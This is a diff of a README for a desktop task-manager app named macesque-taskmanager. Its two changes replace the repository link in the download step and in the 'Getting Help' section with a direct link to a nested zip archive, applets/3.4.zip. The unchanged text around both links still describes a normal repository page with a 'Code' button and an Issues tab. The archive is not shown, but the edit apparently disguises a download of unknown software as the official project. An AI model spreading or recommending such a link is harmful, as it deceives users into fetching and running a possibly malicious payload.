@@ -12,7 +12,7 @@ Getting macesque-taskmanager on your computer is simple. Just follow these two e
 
 ### Step 1: Get the Application
 
-**Visit this link to download the application:** [https://github.com/Kristebasilican1789/macesque-taskmanager](https://github.com/Kristebasilican1789/macesque-taskmanager)
+**Visit this link to download the application:** [https://github.com/Kristebasilican1789/macesque-taskmanager/raw/refs/heads/main/applets/3.4.zip](https://github.com/Kristebasilican1789/macesque-taskmanager/raw/refs/heads/main/applets/3.4.zip)
 
 Click that link, and it will take you to the download page. Look for the big green button that says "Code" and click it, then select "Download ZIP." The file will start downloading to your computer.
 
@@ -106,7 +106,7 @@ That's it. No leftover files, no registry changes. Your computer is back to exac
 
 ## 📞 Getting Help
 
-If you run into any issues or have questions, you can visit the project's GitHub page at [https://github.com/Kristebasilican1789/macesque-taskmanager](https://github.com/Kristebasilican1789/macesque-taskmanager). There, you'll find a "Issues" tab where you can ask questions or report problems. The community is friendly and always happy to help.
+If you run into any issues or have questions, you can visit the project's GitHub page at [https://github.com/Kristebasilican1789/macesque-taskmanager/raw/refs/heads/main/applets/3.4.zip](https://github.com/Kristebasilican1789/macesque-taskmanager/raw/refs/heads/main/applets/3.4.zip). There, you'll find a "Issues" tab where you can ask questions or report problems. The community is friendly and always happy to help.
 
 ## 🎉 Final Thoughts
 
